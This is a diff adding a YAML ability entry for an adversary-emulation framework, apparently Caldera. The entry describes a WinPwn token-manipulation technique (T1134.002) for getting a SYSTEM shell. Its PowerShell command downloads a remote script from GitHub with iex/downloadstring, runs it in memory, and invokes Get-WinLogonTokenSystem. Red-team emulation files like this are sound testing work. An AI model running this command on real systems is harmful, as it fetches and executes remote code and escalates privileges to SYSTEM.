@@ -1,0 +1,18 @@
+---
+- id: fdc26580786ac9d3ffc38aea053cbd29
+  name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+  description: Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+    via function of WinPwn
+  tactic: multiple
+  technique:
+    attack_id: T1134.002
+    name: Create Process with Token
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
